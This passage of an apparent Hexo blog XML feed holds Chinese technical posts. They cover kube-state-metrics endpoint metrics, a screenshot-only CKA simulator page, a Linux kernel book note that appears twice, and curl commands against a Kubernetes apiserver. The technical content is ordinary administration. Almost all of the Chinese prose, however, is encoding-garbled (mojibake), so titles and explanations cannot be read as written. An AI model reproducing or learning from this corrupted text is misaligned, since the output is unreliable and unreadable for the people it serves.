title="å‚è€ƒ"></a>å‚è€ƒ</h2><p><a href="https://www.cnblogs.com/lijiaman/p/12885649.html">Linux ç‰©ç†å·(PV)ã€é€»è¾‘å·(LV)ã€å·ç»„(VG)ç®¡ç†</a></p>]]></content>
    
    
    <categories>
      
      <category>linux</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ã€k8sç³»åˆ—ã€‘(202212) kube-state-metricsä¸­kube_endpoint_addressæŒ‡æ ‡</title>
    <link href="/2022/12/27/k8s/%E3%80%90k8s%E7%B3%BB%E5%88%97%E3%80%91(202212)%20kube-state-metrics%E4%B8%ADkube_endpoint_address%E6%8C%87%E6%A0%87/"/>
    <url>/2022/12/27/k8s/%E3%80%90k8s%E7%B3%BB%E5%88%97%E3%80%91(202212)%20kube-state-metrics%E4%B8%ADkube_endpoint_address%E6%8C%87%E6%A0%87/</url>
    
    <content type="html"><![CDATA[<h2 id="èƒŒæ™¯"><a href="#èƒŒæ™¯" class="headerlink" title="èƒŒæ™¯"></a>èƒŒæ™¯</h2><p>éœ€è¦ä¸€ä¸ªæŒ‡æ ‡æ¥å‘Šè­¦k8sä¸­endpointsä¸­æ²¡æœ‰ipçš„é¡¹</p><p>ç±»ä¼¼äºä¸‹é¢å›¾ä¸­ï¼Œæœ‰äº›epæ˜¯æ²¡æœ‰ipçš„ï¼Œæƒ³è¦æŠŠè¿™äº›é¡¹åŠæ—¶å‘Šè­¦ï¼ŒåŠæ—¶å¤„ç†æŸ¥çœ‹åŸå› </p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221227105708.png" alt="image.png"></p><p>å¯ä»¥çœ‹åˆ°ï¼Œæ€»å…±æœ‰7ä¸ªepï¼Œæœ‰4ä¸ªæ˜¯æ­£å¸¸çš„ï¼Œæœ‰3ä¸ªæ˜¯å¼‚å¸¸çš„(kube-dnsã€kubernetes-dashboardå’Œmetrics-server)</p><h2 id="ç¯å¢ƒ"><a href="#ç¯å¢ƒ" class="headerlink" title="ç¯å¢ƒ"></a>ç¯å¢ƒ</h2><p>kube-state-metricsç‰ˆæœ¬ï¼šv2.6.0</p><h2 id="æ“ä½œ"><a href="#æ“ä½œ" class="headerlink" title="æ“ä½œ"></a>æ“ä½œ</h2><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-comment"># HELP kube_endpoint_address_available (Deprecated since v2.6.0) Number of addresses available in endpoint.</span><br><span class="hljs-comment"># TYPE kube_endpoint_address_available gauge</span><br><br><span class="hljs-comment"># HELP kube_endpoint_address_not_ready (Deprecated since v2.6.0) Number of addresses not ready in endpoint</span><br><span class="hljs-comment"># TYPE kube_endpoint_address_not_ready gauge</span><br><br><span class="hljs-comment"># HELP kube_endpoint_address Information about Endpoint available and non available addresses.</span><br><span class="hljs-comment"># TYPE kube_endpoint_address gauge</span><br></code></pre></td></tr></table></figure><h3 id="æ–¹æ³•1ï¼škube-endpoint-address-not-readyé€‰æ‹©å¤§äº0çš„"><a href="#æ–¹æ³•1ï¼škube-endpoint-address-not-readyé€‰æ‹©å¤§äº0çš„" class="headerlink" title="æ–¹æ³•1ï¼škube_endpoint_address_not_readyé€‰æ‹©å¤§äº0çš„"></a>æ–¹æ³•1ï¼škube_endpoint_address_not_readyé€‰æ‹©å¤§äº0çš„</h3><p>æ€»å…±æœ‰7æ¡ï¼Œå¤§äº0çš„å°±æ˜¯å¼‚å¸¸çš„</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221227103325.png" alt="image.png"></p><p>è¿›è€Œï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œkube-dnsæ˜¾ç¤ºçš„æ˜¯3ï¼Œè€Œkubernetes-dashboardå’Œmetrics-serveræ˜¾ç¤ºçš„æ˜¯1ï¼Œè¿™ä¸ªæ˜¯ä¸ºä»€ä¹ˆå‘¢ï¼Ÿ</p><h4 id="éªŒè¯æ–¹å¼1"><a href="#éªŒè¯æ–¹å¼1" class="headerlink" title="éªŒè¯æ–¹å¼1"></a>éªŒè¯æ–¹å¼1</h4><p>é€šè¿‡æ ‡é¢˜èƒŒæ™¯ä¸­çš„å›¾ç‰‡å¯ä»¥çœ‹åˆ°ï¼Œepä¸­æ˜¾ç¤ºçš„æ˜¯ip:portï¼Œæˆ‘ä»¬å¯ä»¥çœ‹ä¸‹è¿™å‡ ä¸ªepçš„å…·ä½“ç»†èŠ‚ï¼š<br>å¦‚ä¸‹å›¾ï¼Œkube-dnsæœ‰1ä¸ªipï¼Œ3ä¸ªç«¯å£ï¼›kubernetes-dashboardæœ‰1ä¸ªipï¼Œ1ä¸ªç«¯å£ï¼›metrics-serveræœ‰1ä¸ªipï¼Œ1ä¸ªç«¯å£</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221227115503.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221227115442.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221227115420.png" alt="image.png"></p><h4 id="éªŒè¯æ–¹å¼2"><a href="#éªŒè¯æ–¹å¼2" class="headerlink" title="éªŒè¯æ–¹å¼2"></a>éªŒè¯æ–¹å¼2</h4><p>æˆ‘ä»¬æ‰¾æ¥å¦ä¸€ä¸ªé›†ç¾¤k2ï¼Œéƒ¨ç½²æ–¹å¼å’Œkæ˜¯ä¸€æ ·çš„ã€‚<br>æŸ¥çœ‹k2çš„è¿™3ä¸ªepï¼Œå¯ä»¥çœ‹åˆ°åˆ†åˆ«æ˜¯3ã€1ã€1.</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221227120033.png" alt="image.png"></p><h3 id="æ–¹æ³•2ï¼škube-endpoint-address-availableé€‰ç­‰äº0çš„"><a href="#æ–¹æ³•2ï¼škube-endpoint-address-availableé€‰ç­‰äº0çš„" class="headerlink" title="æ–¹æ³•2ï¼škube_endpoint_address_availableé€‰ç­‰äº0çš„"></a>æ–¹æ³•2ï¼škube_endpoint_address_availableé€‰ç­‰äº0çš„</h3><p>æ€»å…±æœ‰7æ¡ï¼Œç­‰äº0çš„å°±æ˜¯å¼‚å¸¸çš„</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221227103740.png" alt="image.png"></p><p>nginxé‚£ä¸ºä»€ä¹ˆæ˜¾ç¤ºçš„æ˜¯3å‘¢ï¼Ÿ<br>æŸ¥çœ‹è¯¥é›†ç¾¤ï¼Œå¯ä»¥çœ‹åˆ°nginxä¸‹é¢æœ‰3é¡¹</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221227120341.png" alt="image.png"></p><h3 id="æ–¹æ³•3ï¼škube-endpoint-address-ready-x3D-â€falseâ€-é€‰å¤§äº0çš„"><a href="#æ–¹æ³•3ï¼škube-endpoint-address-ready-x3D-â€falseâ€-é€‰å¤§äº0çš„" class="headerlink" title="æ–¹æ³•3ï¼škube_endpoint_address{ready&#x3D;â€falseâ€}é€‰å¤§äº0çš„"></a>æ–¹æ³•3ï¼škube_endpoint_address{ready&#x3D;â€falseâ€}é€‰å¤§äº0çš„</h3><p>å› ä¸ºé€‰æ‹©çš„æ˜¯ready&#x3D;â€falseâ€ï¼Œæ‰€ä»¥æ˜¾ç¤ºå‡ºæ¥çš„å°±æ˜¯å¼‚å¸¸çš„</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221227104136.png" alt="image.png"></p><p>æˆ‘ä»¬å†é€‰æ‹©ä¸€ä¸‹ready&#x3D;â€trueâ€<br>å¯ä»¥çœ‹åˆ°æœ‰6é¡¹ï¼Œè¿™æ˜¯ä¸ºä»€ä¹ˆå‘¢ï¼Ÿ<br>ä»”ç»†ä¸€çœ‹ï¼Œkube_endpoint_addressæŒ‡æ ‡åŠ å…¥äº†ipçš„labelï¼Œnginxå› ä¸ºæœ‰3ä¸ªipï¼Œæ‰€ä»¥è¢«æ‹†æˆäº†3é¡¹</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221227120721.png" alt="image.png"></p><h2 id="è§£é‡Š"><a href="#è§£é‡Š" class="headerlink" title="è§£é‡Š"></a>è§£é‡Š</h2><p>v2.6.0åŠ å…¥äº†æ–°çš„æŒ‡æ ‡kube_endpoint_address<br>è¯¦æƒ…å‚è€ƒï¼š<a href="https://github.com/kubernetes/kube-state-metrics/releases">https://github.com/kubernetes/kube-state-metrics/releases</a></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221227101629.png" alt="image.png"></p><p>æˆ‘ä»¬è·³åˆ°1761ï¼Œå¯ä»¥çœ‹åˆ°kube_endpoint_addresså°†æ›¿ä»£kube_endpoint_address_availableå’Œkube_endpoint_address_not_readyï¼Œæ‰€ä»¥ç”¨2.6.0é‡‡é›†å‡ºæ¥çš„æŒ‡æ ‡ï¼Œæ˜¾ç¤ºkube_endpoint_address_availableå’Œkube_endpoint_address_not_ready Deprecated since v2.6.0å‘¢</p><p>è¯¦æƒ…è§ï¼š<a href="https://github.com/kubernetes/kube-state-metrics/pull/1761">https://github.com/kubernetes/kube-state-metrics/pull/1761</a></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221227120934.png" alt="image.png"></p><p>ç»“æŸ~</p><h1 id="x3D-x3D-x3D-x3D-2023-2-7-æ›´æ–°-x3D-x3D-x3D-x3D"><a href="#x3D-x3D-x3D-x3D-2023-2-7-æ›´æ–°-x3D-x3D-x3D-x3D" class="headerlink" title="&#x3D;&#x3D;&#x3D;&#x3D;2023.2.7 æ›´æ–°&#x3D;&#x3D;&#x3D;&#x3D;"></a>&#x3D;&#x3D;&#x3D;&#x3D;2023.2.7 æ›´æ–°&#x3D;&#x3D;&#x3D;&#x3D;</h1><h1 id="kube-endpoint-address-å®éªŒ1ï¼šæ­£å¸¸æƒ…å†µ"><a href="#kube-endpoint-address-å®éªŒ1ï¼šæ­£å¸¸æƒ…å†µ" class="headerlink" title="kube_endpoint_address å®éªŒ1ï¼šæ­£å¸¸æƒ…å†µ"></a>kube_endpoint_address å®éªŒ1ï¼šæ­£å¸¸æƒ…å†µ</h1><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230207102835.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230207104604.png" alt="image.png"></p><h2 id="æ™®ç½—"><a href="#æ™®ç½—" class="headerlink" title="æ™®ç½—"></a>æ™®ç½—</h2><p>æŸ¥è¯¢ready&#x3D;â€falseâ€çš„æ¡æ•°ï¼Œä¸€æ¡éƒ½æ²¡æœ‰ã€‚<br><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230207104318.png" alt="image.png"></p><p>æŸ¥è¯¢ready&#x3D;â€trueâ€çš„æ¡æ•°ï¼Œæ€»å…±æœ‰9æ¡ï¼Œæ­¤å¤„æ‰€æœ‰çš„podéƒ½æ˜¯æ­£å¸¸çš„ã€‚<br><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230207104238.png" alt="image.png"></p><p>è¿™9æ¡æ•°æ®æ˜¯æ€ä¹ˆå’Œpodã€epæ‰€å¯¹åº”çš„å‘¢ï¼Ÿ</p><p>kubernetesæœ‰1æ¡<br>nginxæœ‰3æ¡ï¼Œå¯¹åº”epä¸­çš„3é¡¹ï¼Œ3ä¸ªip<br>kube-dnsä¸­æœ‰1æ¡ï¼Œå¯¹åº”epä¸­çš„3é¡¹ï¼Œ1ä¸ªip<br>metrics-serveræœ‰1æ¡<br>metrics-server-proxyæœ‰1æ¡<br>dashboard-metrics-scraperæœ‰1æ¡<br>kubernetes-dashboardæœ‰1æ¡</p><h2 id="ep"><a href="#ep" class="headerlink" title="ep"></a>ep</h2><p>çœ‹ä¸€ä¸‹è¿™å‡ ä¸ªepçš„è¯¦ç»†ä¿¡æ¯ï¼š</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230207104949.png" alt="image.png"></p><p>Addressesæœ‰3æ¡ï¼Œæ™®ç½—é‚£æ˜¾ç¤ºäº†3æ¡</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230207105128.png" alt="image.png"></p><p>Addressesæœ‰1æ¡ï¼Œæ™®ç½—é‚£æ˜¾ç¤ºäº†1æ¡</p><h1 id="kube-endpoint-address-å®éªŒ2ï¼šæŸä¸€ä¸ªpodæ‰çº¿-podæœ‰ip"><a href="#kube-endpoint-address-å®éªŒ2ï¼šæŸä¸€ä¸ªpodæ‰çº¿-podæœ‰ip" class="headerlink" title="kube_endpoint_address å®éªŒ2ï¼šæŸä¸€ä¸ªpodæ‰çº¿(podæœ‰ip)"></a>kube_endpoint_address å®éªŒ2ï¼šæŸä¸€ä¸ªpodæ‰çº¿(podæœ‰ip)</h1><h2 id="åœºæ™¯"><a href="#åœºæ™¯" class="headerlink" title="åœºæ™¯"></a>åœºæ™¯</h2><p>ä¿®æ”¹nginxçš„ä¸€ä¸ªpodï¼Œæ›´æ”¹å…¶é•œåƒï¼Œä½¿å…¶å®•æ‰</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230207110803.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230207110849.png" alt="image.png"></p><p>å¯ä»¥çœ‹åˆ°nginxå¤„çš„epç”±3ä¸ªå˜æˆäº†2ä¸ª</p><h2 id="æ™®ç½—-1"><a href="#æ™®ç½—-1" class="headerlink" title="æ™®ç½—"></a>æ™®ç½—</h2><p>æ­¤æ—¶æ™®ç½—ä¸­ ready&#x3D;â€trueâ€çš„nginxå˜æˆäº†2æ¡</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230207111355.png" alt="image.png"></p><p>æ™®ç½—ä¸­ ready&#x3D;â€falseâ€çš„nginxæœ‰äº†1æ¡<br><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230207111627.png" alt="image.png"></p><h2 id="ep-1"><a href="#ep-1" class="headerlink" title="ep"></a>ep</h2><p>å†çœ‹nginxçš„epï¼š</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230207113935.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230207110957.png" alt="image.png"></p><p>Addressesæœ‰2æ¡ï¼Œæ™®ç½—é‚£ready&#x3D;trueæ˜¾ç¤ºäº†2æ¡<br>NotReadyAddressesæœ‰1æ¡ï¼Œæ™®ç½—é‚£ready&#x3D;falseæ˜¾ç¤ºäº†1æ¡</p><h1 id="kube-endpoint-address-å®éªŒ3ï¼špodå¼‚å¸¸-podæ— ip"><a href="#kube-endpoint-address-å®éªŒ3ï¼špodå¼‚å¸¸-podæ— ip" class="headerlink" title="kube_endpoint_address å®éªŒ3ï¼špodå¼‚å¸¸(podæ— ip)"></a>kube_endpoint_address å®éªŒ3ï¼špodå¼‚å¸¸(podæ— ip)</h1><h2 id="åœºæ™¯-1"><a href="#åœºæ™¯-1" class="headerlink" title="åœºæ™¯"></a>åœºæ™¯</h2><p>åœºæ™¯ï¼šå½“k8sçš„ç½‘ç»œæ’ä»¶æœ‰é—®é¢˜æ—¶ï¼Œä¼šå¯¼è‡´podåˆ†ä¸åˆ°ip</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230207112635.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230207113121.png" alt="image.png"></p><h2 id="æ™®ç½—-2"><a href="#æ™®ç½—-2" class="headerlink" title="æ™®ç½—"></a>æ™®ç½—</h2><p>æ­¤æ—¶æ™®ç½—ä¸­ ready&#x3D;â€trueâ€æ€»å…±æœ‰6æ¡ï¼Œæ²¡æœ‰nginxç›¸å…³çš„äº†</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230207112942.png" alt="image.png"></p><p>æ™®ç½—ä¸­ ready&#x3D;â€falseâ€çš„æ²¡æœ‰æ•°æ®äº†<br><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230207113152.png" alt="image.png"></p><p>æ‰€ä»¥ï¼Œè¯¥æŒ‡æ ‡(kube_endpoint_address)æ˜¯æ£€æµ‹ä¸åˆ°è¿™ç§å¼‚å¸¸åœºæ™¯çš„~</p><h2 id="ep-2"><a href="#ep-2" class="headerlink" title="ep"></a>ep</h2><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230207140241.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230207140254.png" alt="image.png"></p><h1 id="æºç å‰–æ"><a href="#æºç å‰–æ" class="headerlink" title="æºç å‰–æ"></a>æºç å‰–æ</h1><p>å‚è€ƒï¼š<a href="https://github.com/kubernetes/kube-state-metrics/blob/main/internal/store/endpoint.go">https://github.com/kubernetes/kube-state-metrics/blob/main/internal/store/endpoint.go</a></p><h2 id="kube-endpoint-address-available"><a href="#kube-endpoint-address-available" class="headerlink" title="kube_endpoint_address_available"></a>kube_endpoint_address_available</h2><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230207114742.png" alt="image.png"></p><h2 id="kube-endpoint-address-not-ready"><a href="#kube-endpoint-address-not-ready" class="headerlink" title="kube_endpoint_address_not_ready"></a>kube_endpoint_address_not_ready</h2><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230207114804.png" alt="image.png"></p><h2 id="kube-endpoint-address"><a href="#kube-endpoint-address" class="headerlink" title="kube_endpoint_address"></a>kube_endpoint_address</h2><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230207114838.png" alt="image.png"></p><p>å¯„è¯­ï¼šä½ èµ°çš„æ¯ä¸€æ­¥éƒ½ç®—æ•°ï¼</p><h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><p><a href="https://github.com/kubernetes/kube-state-metrics/releases">https://github.com/kubernetes/kube-state-metrics/releases</a><br><a href="https://github.com/kubernetes/kube-state-metrics/pull/1761">https://github.com/kubernetes/kube-state-metrics/pull/1761</a></p>]]></content>
    
    
    <categories>
      
      <category>k8s</category>
      
    </categories>
    
    
    <tags>
      
      <tag>k8s</tag>
      
      <tag>kube-state-metrics</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ã€k8sç³»åˆ—ã€‘(202212)ckaæ¨¡æ‹Ÿå™¨</title>
    <link href="/2022/12/24/k8s/%E3%80%90k8s%E7%B3%BB%E5%88%97%E3%80%91(202212)%20cka%E6%A8%A1%E6%8B%9F%E5%99%A8/"/>
    <url>/2022/12/24/k8s/%E3%80%90k8s%E7%B3%BB%E5%88%97%E3%80%91(202212)%20cka%E6%A8%A1%E6%8B%9F%E5%99%A8/</url>
    
    <content type="html"><![CDATA[<h2 id="1"><a href="#1" class="headerlink" title="1"></a>1</h2><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221224161552.png" alt="image.png"></p><h2 id="2"><a href="#2" class="headerlink" title="2"></a>2</h2><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221224161612.png" alt="image.png"></p><h2 id="3"><a href="#3" class="headerlink" title="3"></a>3</h2><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221224161629.png" alt="image.png"></p><h2 id="4"><a href="#4" class="headerlink" title="4"></a>4</h2><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221224161643.png" alt="image.png"></p><h2 id="5"><a href="#5" class="headerlink" title="5"></a>5</h2><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221224161656.png" alt="image.png"></p><h2 id="6"><a href="#6" class="headerlink" title="6"></a>6</h2><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221224161709.png" alt="image.png"></p><h2 id="7"><a href="#7" class="headerlink" title="7"></a>7</h2><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221224161721.png" alt="image.png"></p><h2 id="8"><a href="#8" class="headerlink" title="8"></a>8</h2><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221224161738.png" alt="image.png"></p><h2 id="9"><a href="#9" class="headerlink" title="9"></a>9</h2><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221224161753.png" alt="image.png"></p><h2 id="10"><a href="#10" class="headerlink" title="10"></a>10</h2><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221224161808.png" alt="image.png"></p><h2 id="11"><a href="#11" class="headerlink" title="11"></a>11</h2><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221224161819.png" alt="image.png"></p><h2 id="12"><a href="#12" class="headerlink" title="12"></a>12</h2><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221224161833.png" alt="image.png"></p><h2 id="13"><a href="#13" class="headerlink" title="13"></a>13</h2><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221224161940.png" alt="image.png"></p><h2 id="14"><a href="#14" class="headerlink" title="14"></a>14</h2><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221224161916.png" alt="image.png"></p><h2 id="15"><a href="#15" class="headerlink" title="15"></a>15</h2><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221224161957.png" alt="image.png"></p><h2 id="16"><a href="#16" class="headerlink" title="16"></a>16</h2><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221224162012.png" alt="image.png"></p><h2 id="17"><a href="#17" class="headerlink" title="17"></a>17</h2><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221224162029.png" alt="image.png"></p><h2 id="18"><a href="#18" class="headerlink" title="18"></a>18</h2><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221224162045.png" alt="image.png"></p><h2 id="19"><a href="#19" class="headerlink" title="19"></a>19</h2><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221224162059.png" alt="image.png"></p><h2 id="20"><a href="#20" class="headerlink" title="20"></a>20</h2><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221224162112.png" alt="image.png"></p><h2 id="21"><a href="#21" class="headerlink" title="21"></a>21</h2><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221224162125.png" alt="image.png"></p><h2 id="22"><a href="#22" class="headerlink" title="22"></a>22</h2><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221224162138.png" alt="image.png"></p><h2 id="23"><a href="#23" class="headerlink" title="23"></a>23</h2><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221224162152.png" alt="image.png"></p><h2 id="24"><a href="#24" class="headerlink" title="24"></a>24</h2><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221224162207.png" alt="image.png"></p><h2 id="25"><a href="#25" class="headerlink" title="25"></a>25</h2><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221224162220.png" alt="image.png"></p><p>å‚è€ƒç­”æ¡ˆï¼š<br><a href="https://killer.sh/attendee/07579e88-c73f-4925-9c55-3d4aba3b012a/content">https://killer.sh/attendee/07579e88-c73f-4925-9c55-3d4aba3b012a/content</a></p>]]></content>
    
    
    <categories>
      
      <category>k8s</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Linuxå†…æ ¸è®¾è®¡ä¸å®ç°</title>
    <link href="/2022/12/22/linux%E5%86%85%E6%A0%B8%E8%B0%83%E8%AF%95/Linux%E5%86%85%E6%A0%B8%E8%AE%BE%E8%AE%A1%E4%B8%8E%E5%AE%9E%E7%8E%B0/"/>
    <url>/2022/12/22/linux%E5%86%85%E6%A0%B8%E8%B0%83%E8%AF%95/Linux%E5%86%85%E6%A0%B8%E8%AE%BE%E8%AE%A1%E4%B8%8E%E5%AE%9E%E7%8E%B0/</url>
    
    <content type="html"><![CDATA[<p>æœ¬ä¹¦ä½œè€…ï¼šRobert Love<br>æœ¬ä¹¦è¯‘è€…ï¼šé™ˆè‰å› åº·å</p><p>Linuxå†…æ ¸ä¹‹æ—…ï¼š<a href="http://kerneltravel.net/">http://kerneltravel.net/</a><br>å†…æ ¸ç‰ˆæœ¬ï¼š2.6.34</p><p>å†…æ ¸å·¨è‘—ã€ŠUnderstanding the Linux Kernelã€‹<br>å®è·µç»å…¸ã€ŠLinux Device Driversã€‹</p><h2 id="ç¬¬1ç« -Linuxå†…æ ¸ç®€ä»‹"><a href="#ç¬¬1ç« -Linuxå†…æ ¸ç®€ä»‹" class="headerlink" title="ç¬¬1ç«  Linuxå†…æ ¸ç®€ä»‹"></a>ç¬¬1ç«  Linuxå†…æ ¸ç®€ä»‹</h2><p>ä¸€èˆ¬æƒ…å†µä¸‹ï¼ŒLinuxè¿™ä¸ªè¯æ±‡ä¸»è¦æ˜¯æŒ‡å†…æ ¸</p><p>Linuxå†…æ ¸å¼€å‘è€…ç¤¾åŒº æœ€é‡è¦çš„è®ºå› lkml(linux kernel mailing list)  <a href="https://lkml.org/">https://lkml.org/</a><br>è®¢é˜…é‚®ä»¶ <a href="http://vger.kernel.org/">http://vger.kernel.org/</a>   </p>]]></content>
    
    
    <categories>
      
      <category>linuxå†…æ ¸è°ƒè¯•</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Linuxå†…æ ¸è®¾è®¡ä¸å®ç°</title>
    <link href="/2022/12/22/linux%E5%86%85%E6%A0%B8%E8%B0%83%E8%AF%95/unsupported/Linux%E5%86%85%E6%A0%B8%E8%AE%BE%E8%AE%A1%E4%B8%8E%E5%AE%9E%E7%8E%B0/"/>
    <url>/2022/12/22/linux%E5%86%85%E6%A0%B8%E8%B0%83%E8%AF%95/unsupported/Linux%E5%86%85%E6%A0%B8%E8%AE%BE%E8%AE%A1%E4%B8%8E%E5%AE%9E%E7%8E%B0/</url>
    
    <content type="html"><![CDATA[<p>æœ¬ä¹¦ä½œè€…ï¼šRobert Love<br>æœ¬ä¹¦è¯‘è€…ï¼šé™ˆè‰å› åº·å</p><p>Linuxå†…æ ¸ä¹‹æ—…ï¼š<a href="http://kerneltravel.net/">http://kerneltravel.net/</a><br>å†…æ ¸ç‰ˆæœ¬ï¼š2.6.34</p><p>å†…æ ¸å·¨è‘—ã€ŠUnderstanding the Linux Kernelã€‹<br>å®è·µç»å…¸ã€ŠLinux Device Driversã€‹</p><h2 id="ç¬¬1ç« -Linuxå†…æ ¸ç®€ä»‹"><a href="#ç¬¬1ç« -Linuxå†…æ ¸ç®€ä»‹" class="headerlink" title="ç¬¬1ç«  Linuxå†…æ ¸ç®€ä»‹"></a>ç¬¬1ç«  Linuxå†…æ ¸ç®€ä»‹</h2><p>ä¸€èˆ¬æƒ…å†µä¸‹ï¼ŒLinuxè¿™ä¸ªè¯æ±‡ä¸»è¦æ˜¯æŒ‡å†…æ ¸</p><p>Linuxå†…æ ¸å¼€å‘è€…ç¤¾åŒº æœ€é‡è¦çš„è®ºå› lkml(linux kernel mailing list)  <a href="https://lkml.org/">https://lkml.org/</a><br>è®¢é˜…é‚®ä»¶ <a href="http://vger.kernel.org/">http://vger.kernel.org/</a>   </p>]]></content>
    
    
    <categories>
      
      <category>linuxå†…æ ¸è°ƒè¯•</category>
      
      <category>unsupported</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ã€ç½‘ç»œæˆé•¿è®°ã€‘curlå¸¸ç”¨å‘½ä»¤</title>
    <link href="/2022/12/21/net/%E3%80%90%E7%BD%91%E7%BB%9C%E6%88%90%E9%95%BF%E8%AE%B0%E3%80%91curl%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"/>
    <url>/2022/12/21/net/%E3%80%90%E7%BD%91%E7%BB%9C%E6%88%90%E9%95%BF%E8%AE%B0%E3%80%91curl%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/</url>
    
    <content type="html"><![CDATA[<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># è¿™ä¸¤ä¸ªç­‰ä»·</span><br>time curl 191.168.3.100:30001<br>time curl web-nginx-entrypoint.default<br><br><span class="hljs-comment"># è¿™æ ·å­å¯è¡Œ</span><br>time curl https://11.254.0.1:443/version --cacert /root/k8s/certs/ca.pem --key /root/k8s/certs/apiserver-key.pem --cert /root/k8s/certs/apiserver.pem<br><span class="hljs-comment"># è¿™æ ·å­ä¸è¡Œ</span><br>time curl kubernetes.default/version --cacert /root/k8s/certs/ca.pem --key /root/k8s/certs/apiserver-key.pem --cert /root/k8s/certs/apiserver.pem<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>net</category>
      
    </categories>
    
    
    <tags>
      
      <tag>net</tag>
      
      <tag>curl</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ã€ç½‘ç»œæˆé•¿è®°ã€‘tcpdumpå¸¸ç”¨å‘½ä»¤</title>
